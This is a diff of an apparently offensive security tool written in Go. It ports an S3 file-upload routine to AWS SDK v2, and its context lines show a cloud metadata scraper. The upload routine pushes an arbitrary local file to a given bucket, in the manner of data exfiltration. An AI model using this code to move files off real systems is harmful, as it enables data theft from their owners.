@@ -5,6 +5,7 @@ import (
 	"bufio"
 	"bytes"
 	"compress/gzip"
+	"context"
 	"crypto/tls"
 	"fmt"
 	"io"
@@ -22,10 +23,10 @@ import (
 	"syscall"
 	"time"
 
-	"github.com/aws/aws-sdk-go/aws"
-	"github.com/aws/aws-sdk-go/aws/credentials"
-	"github.com/aws/aws-sdk-go/aws/session"
-	"github.com/aws/aws-sdk-go/service/s3/s3manager"
+	"github.com/aws/aws-sdk-go-v2/aws"
+	awsconfig "github.com/aws/aws-sdk-go-v2/config"
+	s3manager "github.com/aws/aws-sdk-go-v2/feature/s3/manager"
+	"github.com/aws/aws-sdk-go-v2/service/s3"
 	"github.com/creack/pty"
 	"github.com/tv42/httpunix"
 	"golang.org/x/crypto/ssh/terminal"
@@ -99,30 +100,31 @@ func scrapeGcpMetadata(host, port string) (string, error) {
 func testUploadOfS3(fileToPush, s3Bucket, s3Region string) {
 	fmt.Printf("[+] Pushing %s to -> %s\n", fileToPush, s3Bucket)
 
-	s, err := session.NewSession(&aws.Config{
-		Region:      aws.String(s3Region),
-		Credentials: credentials.AnonymousCredentials,
-	})
-
+	cfg, err := awsconfig.LoadDefaultConfig(
+		context.Background(),
+		awsconfig.WithRegion(s3Region),
+	)
 	if err != nil {
 		fmt.Println("[ERROR] ", err)
 	}
 
-	err = s3Push(s, fileToPush, s3Bucket)
+	// Create an S3 Client with the config
+	client := s3.NewFromConfig(cfg)
+	err = s3Push(client, fileToPush, s3Bucket)
 	if err != nil {
 		fmt.Println("[ERROR] ", err)
 	}
 }
 
-func s3Push(s *session.Session, filename, s3Bucket string) error {
-	uploader := s3manager.NewUploader(s)
+func s3Push(c *s3.Client, filename, s3Bucket string) error {
+	uploader := s3manager.NewUploader(c)
 
 	file, err := os.Open(filename)
 	if err != nil {
 		return fmt.Errorf("failed to open file %q, %v", filename, err)
 	}
 
-	result, err := uploader.Upload(&s3manager.UploadInput{
+	result, err := uploader.Upload(context.Background(), &s3.PutObjectInput{
 		Bucket: aws.String(s3Bucket),
 		Key:    aws.String(filename),
 		Body:   file,
